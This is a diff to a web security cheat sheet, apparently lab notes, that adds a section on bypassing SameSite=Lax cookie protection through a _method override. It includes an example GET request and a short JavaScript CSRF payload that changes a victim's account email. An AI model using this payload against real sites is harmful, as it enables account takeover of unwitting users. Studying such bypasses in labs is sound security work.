@@ -153,9 +153,22 @@ Key Note:
 Set-Cookie: session=bciZoELY2ukJUUOj1zJ7wcAGdYXtvq3C; Secure; HttpOnly; SameSite=Strict
 ```
 
-### Steps
+### Lax Bypass Via Method Override
 
-1. **Change request method from POST to GET**: Test if SameSite policy can be bypassed with a GET request.
-2. **Via cookie refresh**: Simulate a refresh to force SameSite cookie behavior.
+1. **Change request method from POST to GET in Burp**
+2. **Try overriding the method by adding the ```_method``` parameter to the query string**
+
+**Example**: GET /my-account/change-email?email=pwned@hacked.com```&_method=POST``` HTTP/1.1
+
+**Payload**
+```javascript
+<script>
+    document.location = "https://vulnerable.web/my-account/change-email?email=pwned@hacked.com&_method=POST";
+</script>
+```
 
 --- 
+Key Note:
+```plaintext
+Set-Cookie: session=bciZoELY2ukJUUOj1zJ7wcAGdYXtvq3C; Secure; HttpOnly; SameSite=Strict
+```
